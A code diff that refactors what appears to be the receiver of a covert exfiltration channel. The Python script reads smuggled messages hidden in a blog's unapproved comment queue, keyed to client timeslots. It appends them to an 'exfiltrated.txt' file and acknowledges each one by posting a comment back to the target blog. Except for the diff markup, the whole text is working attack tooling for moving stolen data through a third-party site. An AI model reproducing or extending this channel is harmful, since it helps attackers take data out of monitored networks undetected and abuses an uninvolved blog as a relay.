@@ -72,8 +72,11 @@ for i in range(1, 4):
 if prev_unapproved_index == 0:
     prev_unapproved_index = get_current_unapproved_index()
 
-loop_counter = 99
-while(loop_counter > 0):
+def receive_data(num_of_receivers):
+    global prev_unapproved_index
+
+    received_data = []
+    
     print("[INFO] Delaying to client timeslot. " + str(client_time_slot))
     delay_to_timeslot(client_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time()
@@ -86,10 +89,10 @@ while(loop_counter > 0):
     index_client = 0
     processed_unapproved_indexes = []
             
-    while index_client < len(clients):
+    while index_client < num_of_receivers:
         print("## checking index_client: " + str(index_client))
         
-        for index_offset in range(1, len(clients) + 1 + 1):
+        for index_offset in range(1, num_of_receivers + 1 + 1):
             print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
             current_unapproved_index = prev_unapproved_index + index_offset
             print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
@@ -110,16 +113,7 @@ while(loop_counter > 0):
                 elem = elems[-1]
                 if elem and elem.string:
                     exfil_content = str(elem.string).strip()
-                    to_write = str(datetime.datetime.utcnow()) + ": "
-                    to_write += "Extracted data with timeslot of " + str(client_time_slot) + ": " + exfil_content + "\n"
-                    print("[INFO] " + to_write);
-                    f = open("../output/exfiltrated.txt", "a")
-                    f.write(to_write)
-                    f.close()
-
-                    message_id = exfil_content.split(":")[0]
-                    print("[INFO] Extracted message_id is " + message_id)
-                    submit_comment(target_blog, ack_channel_id, message_id)
+                    received_data.append(exfil_content)
 
                     processed_unapproved_indexes.append(current_unapproved_index)
                     print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
@@ -130,4 +124,22 @@ while(loop_counter > 0):
         index_client += 1
 
     prev_unapproved_index = get_current_unapproved_index()
+
+    return received_data
+    
+loop_counter = 99
+while(loop_counter > 0):
+    received_data = receive_data(len(clients))
+    for exfil_content in received_data:
+        to_write = str(datetime.datetime.utcnow()) + ": "
+        to_write += "Extracted data with timeslot of " + str(client_time_slot) + ": " + exfil_content + "\n"
+        print("[INFO] " + to_write);
+        f = open("../output/exfiltrated.txt", "a")
+        f.write(to_write)
+        f.close()
+        
+        message_id = exfil_content.split(":")[0]
+        print("[INFO] Extracted message_id is " + message_id)
+        submit_comment(target_blog, ack_channel_id, message_id)
+
     loop_counter -= 1
